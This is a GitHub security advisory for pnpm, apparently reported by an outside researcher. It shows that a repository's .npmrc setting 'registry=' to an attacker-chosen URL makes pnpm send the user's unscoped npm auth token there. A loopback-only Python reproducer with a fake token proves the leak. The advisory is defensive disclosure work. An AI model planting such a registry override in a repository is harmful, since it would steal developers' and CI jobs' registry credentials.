# [M] pnpm binds unscoped user-level npm auth credentials to a repository-selected registry

## Summary
Severity: Medium
Advisory: GHSA-cjhr-43r9-cfmw
CVE: CVE-2026-50017
CWE: CWE-200, CWE-522
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-cjhr-43r9-cfmw
Type: github-advisory

## Affected
- npm: `pnpm` — affected >=0 <10.34.0
- npm: `pnpm` — affected >=11.0.0 <11.4.0

## Details
## Summary

pnpm can send user-level unscoped npm authentication credentials to a registry chosen by a repository-local `.npmrc` file.

In the reproduced case, the user's npm config contains a default registry and an unscoped `_authToken`. The repository does not provide a token-bearing auth line. It only sets `registry=` to a different registry URL. During normal pnpm metadata/install workflows, pnpm binds the user-origin unscoped credential to the repository-selected registry and sends it as an `Authorization` header.

This was reproduced with fake credentials and loopback registries only. No third-party registry or real token was used.

## Affected Behavior Observed

Observed affected:

- pnpm `10.33.2`: `pnpm install --ignore-scripts` sends the user-level unscoped `_authToken` to the repository-selected registry.
- pnpm `11.1.3`: `pnpm install --ignore-scripts` sends the user-level unscoped `_authToken` to the repository-selected registry.
- pnpm `11.2.1` (`next-11` dist tag at testing time): `pnpm install --ignore-scripts` sends the user-level unscoped `_authToken` to the repository-selected registry.
- pnpm `11.1.3`: `pnpm view` also sends user-level unscoped `_authToken`, `_auth`, and `username` / `_password` credentials to the repository-selected registry in the local loopback replay.

Control:

- npm `10.9.7` rejects the same unscoped user `_authToken` configuration with `ERR_INVALID_AUTH` and does not send an `Authorization` header to the  repository-selected registry.
- URL-scoped registry token controls held in the local loopback replay: tokens scoped to the trusted registry URL were not sent to the attacker registry.

## Threat Model

Victim:

- developer or CI job with user-level npm registry credentials configured;
- runs `pnpm install`, `pnpm view`, or an equivalent pnpm metadata/restore command in a repository.

Attacker:

- controls repository-local package manager configuration, such as `.npmrc`;
- can set `registry=` to a registry endpoint they control;
- does not need to provide a token-bearing auth line for the strong case.

Boundary:

Credentials from a higher-trust user configuration should not be rebound to a lower-trust repository-selected registry unless the credential is explicitly scoped to that registry.

## Minimal Reproduction

The reproducer below starts two loopback HTTP registries:

- a trusted registry URL used in the isolated user `.npmrc`;
- an attacker registry URL used in the repository-local `.npmrc`.

The isolated user `.npmrc` contains:

```ini
registry=<trusted-loopback-registry>
_authToken=PR166_FAKE_REGISTRY_TOKEN
```

The repository-local `.npmrc` contains:

```ini
registry=<attacker-loopback-registry>
```

The repository `package.json` depends on a toy package served by the loopback registry. The script then runs:

```text
pnpm install --ignore-scripts
npm install --ignore-scripts
```

## Expected Safe Behavior

pnpm should not send the user-level unscoped `_authToken` to the repository-selected registry. A safe behavior would be to reject or ignore the unscoped credential in this lower-trust registry-rebinding situation and require the credential to be URL-scoped to the selected registry.

## Observed Behavior

pnpm `10.33.2`, pnpm `11.1.3`, and pnpm `11.2.1` send:

```http
Authorization: Bearer PR166_FAKE_REGISTRY_TOKEN
```

to the attacker loopback registry during install. npm `10.9.7` rejects the same config and sends no `Authorization` header.

## Security Impact

This can disclose npm registry credentials from user-level configuration to a registry endpoint selected by an untrusted repository. The leak occurs before package lifecycle scripts run and does not depend on package code execution.

## Non-Claims

This report does not claim:

- remote code execution;
- registry account compromise by itself;
- leakage of URL-scoped tokens for a different registry;
- npm CLI impact;
- impact from a repository explicitly committing its own token-bearing auth
  line.

## Source-Level Notes

In pnpm's config/auth-header flow, unscoped/default credentials are parsed from the merged auth config and stored as default credentials. The auth-header logic then maps those default credentials to the effective default registry. Because repository-local `.npmrc` can change the effective default registry, higher-trust default credentials can be applied to a lower-trust registry choice.

## Suggested Fix Direction

The conservative fix direction is to reject or contain unscoped/default auth credentials when a lower-trust workspace/repository config changes the default registry. A compatibility-preserving fix could track the source layer of both the default registry and the default credentials, then only bind default credentials to a registry selected by the same or higher-trust source. A stricter npm-compatible fix would reject unscoped auth and require URL-scoped
credentials.

This needs maintainer semantic review and compatibility control because some legacy workflows may intentionally rely on default/unscoped auth.

## Runnable Reproducer

Save the following as `repro.py` and run it with Python 3 in an environment with pnpm and npm available. To force a specific pnpm version through Corepack, set `PR166_PNPM_SPEC`, for example `PR166_PNPM_SPEC=11.2.1`.

```python
import base64
import contextlib
import hashlib
import http.server
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import threading
from pathlib import Path


"""Standalone loopback reproducer.

It creates only temporary directories and loopback HTTP servers. Cleanup is handled by TemporaryDirectory context managers and registry shutdown handlers; no persistent state is expected outside the package-manager cache directories inside the temporary home. Non-claims: this does not use real credentials, third-party registries, package scripts, or remote services. Failure paths return exit 1 or exit 2 through sys.exit(main()).
"""

TOKEN = "PR166_FAKE_REGISTRY_TOKEN"
PACKAGE_TGZ = None


class RegistryHandler(http.server.BaseHTTPRequestHandler):
    requests = []

    def do_GET(self):
        self.requests.append(
            {
                "method": self.command,
                "path": self.path,
                "authorization": self.headers.get("Authorization"),
            }
        )
        if self.path.endswith(".tgz"):
            payload = make_package_tgz()
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)
            return

        payload = make_package_tgz()
        body = json.dumps(
            {
                "name": "@private/probe",
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": {
                        "name": "@private/probe",
                        "version": "1.0.0",
                        "dist": {
                            "tarball": f"http://127.0.0.1:{self.server.server_port}/private/@private/probe/-/probe-1.0.0.tgz",
                            "shasum": hashlib.sha1(payload).hexdigest(),
                            "integrity": "sha512-"
                            + base64.b64encode(hashlib.sha512(payload).digest()).decode("ascii"),
                        },
                    }
                },
            }
        ).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


@contextlib.contextmanager
def registry():
    handler = type("RecordingRegistryHandler", (RegistryHandler,), {"requests": []})
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server, handler.requests
    finally:
        server.shutdown()
        thread.join(timeout=5)
        server.server_close()


def make_package_tgz():
    global PACKAGE_TGZ
    if PACKAGE_TGZ is not None:
        return PACKAGE_TGZ
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w:gz") as tf:
        data = b'{"name":"@private/probe","version":"1.0.0"}\n'
        info = tarfile.TarInfo("package/package.json")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    PACKAGE_TGZ = bio.getvalue()
    return PACKAGE_TGZ


def write_text(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def run_install(tool, trusted_url, attacker_url):
    exe = shutil.which(tool)
    if exe is None:
        return {"tool": tool, "error": "missing"}
    cmd = [exe, "install", "--ignore-scripts"]
    if tool == "pnpm" and os.environ.get("PR166_PNPM_SPEC"):
        corepack = shutil.which("corepack")
        if corepack is None:
            return {"tool": tool, "error": "corepack missing"}
        cmd = [corepack, f"pnpm@{os.environ['PR166_PNPM_SPEC']}", "install", "--ignore-scripts"]

    with tempfile.TemporaryDirectory(prefix=f"pr166-min-{tool}-") as td:
        root = Path(td)
        home = root / "home"
        project = root / "project"
        home.mkdir()
        project.mkdir()
        userconfig = home / ".npmrc"

        write_text(userconfig, f"registry={trusted_url}\n_authToken={TOKEN}\n")
        write_text(project / ".npmrc", f"registry={attacker_url}\n")
        write_text(
            project / "package.json",
            '{"name":"pr166-probe","version":"1.0.0","dependencies":{"@private/probe":"1.0.0"}}\n',
        )

        env = os.environ.copy()
        env.update(
            {
                "HOME": str(home),
                "USERPROFILE": str(home),
                "NPM_CONFIG_USERCONFIG": str(userconfig),
                "npm_config_userconfig": str(userconfig),
                "NPM_CONFIG_CACHE": str(home / "cache"),
                "npm_config_cache": str(home / "cache"),
                "NPM_CONFIG_STORE_DIR": str(home / "store"),
                "npm_config_store_dir": str(home / "store"),
                "XDG_CACHE_HOME": str(home / "xdg-cache"),
                "XDG_DATA_HOME": str(home / "xdg-data"),
                "NO_COLOR": "1",
            }
        )

        proc = subprocess.run(
            cmd,
            cwd=str(project),
            env=env,
            text=True,
            encoding="utf-8",
            errors="replace",
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=60,
        )
        return {"tool": tool, "returncode": proc.returncode, "output_tail": proc.stdout[-2000:]}


def summarize(tool, result, attacker_requests):
    auth_hits = [r for r in attacker_requests if r.get("authorization")]
    return {
        "tool": tool,
        "result": result,
        "attacker_auth_hits": auth_hits,
        "attacker_request_count": len(attacker_requests),
    }


def tool_version(tool):
    exe = shutil.which(tool)
    if exe is None:
        return "missing"
    cmd = [exe, "--version"]
    if tool == "pnpm" and os.environ.get("PR166_PNPM_SPEC"):
        corepack = shutil.which("corepack")
        if corepack is None:
            return "corepack missing"
        cmd = [corepack, f"pnpm@{os.environ['PR166_PNPM_SPEC']}", "--version"]
    proc = subprocess.run(
        cmd,
        text=True,
        encoding="utf-8",
        errors="replace",
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=20,
    )
    return proc.stdout.strip() or f"exit-{proc.returncode}"


def main():
    pnpm_version = tool_version("pnpm")
    npm_version = tool_version("npm")
    print(f"TARGET_VERSION=pnpm {pnpm_version}; npm {npm_version}")
    if pnpm_version == "missing" or npm_version == "missing":
        print("CHECK environment_has_pnpm_and_npm result=fail")
        return 1

    print("ENVIRONMENT_READY")
    overall = []
    with registry() as (trusted, _trusted_requests), registry() as (attacker, attacker_requests):
        trusted_url = f"http://127.0.0.1:{trusted.server_port}/private/"
        attacker_url = f"http://127.0.0.1:{attacker.server_port}/private/"

        before = len(attacker_requests)
        pnpm_result = run_install("pnpm", trusted_url, attacker_url)
        pnpm_summary = summarize("pnpm", pnpm_result, attacker_requests[before:])
        overall.append(pnpm_summary)

        before = len(attacker_requests)
        npm_result = run_install("npm", trusted_url, attacker_url)
        npm_summary = summarize("npm", npm_result, attacker_requests[before:])
        overall.append(npm_summary)

    print(json.dumps(overall, indent=2))

    pnpm_leaked = bool(overall[0]["attacker_auth_hits"])
    npm_leaked = bool(overall[1]["attacker_auth_hits"])
    print(f"OBSERVED_PNPM_AUTH_HITS={len(overall[0]['attacker_auth_hits'])}")
    print(f"OBSERVED_NPM_AUTH_HITS={len(overall[1]['attacker_auth_hits'])}")
    print(
        "COMMAND_EXIT_CODE="
        f"pnpm:{overall[0]['result'].get('returncode', 'missing')} "
        f"npm:{overall[1]['result'].get('returncode', 'missing')}"
    )
    if pnpm_leaked and not npm_leaked:
        print("CHECK pnpm_leaked=true npm_control_held=true result=pass")
        print("VULNERABLE_BEHAVIOR_CONFIRMED")
        print("RESULT_PNPM_REBINDS_UNSCOPED_USER_TOKEN_NPM_CONTROL_HELD")
        print("RESULT_SECURITY_BOUNDARY_BYPASS_CONFIRMED")
        return 0
    if pnpm_leaked and npm_leaked:
        print("CHECK pnpm_leaked=true npm_control_held=false result=fail")
        print("RESULT_BOTH_TOOLS_SENT_AUTH")
        return 2
    print("CHECK pnpm_leaked=false result=fail")
    print("RESULT_NO_PNPM_AUTH_LEAK")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

## Abbreviated Expected Output

```text
TARGET_VERSION=pnpm 11.2.1; npm 10.9.7
ENVIRONMENT_READY
...
OBSERVED_PNPM_AUTH_HITS=3
OBSERVED_NPM_AUTH_HITS=0
COMMAND_EXIT_CODE=pnpm:0 npm:1
CHECK pnpm_leaked=true npm_control_held=true result=pass
VULNERABLE_BEHAVIOR_CONFIRMED
RESULT_PNPM_REBINDS_UNSCOPED_USER_TOKEN_NPM_CONTROL_HELD
RESULT_SECURITY_BOUNDARY_BYPASS_CONFIRMED
```

Reporter: JUNYI LIU

## References
- https://github.com/pnpm/pnpm/security/advisories/GHSA-cjhr-43r9-cfmw
- https://nvd.nist.gov/vuln/detail/CVE-2026-50017
- https://github.com/pnpm/pnpm
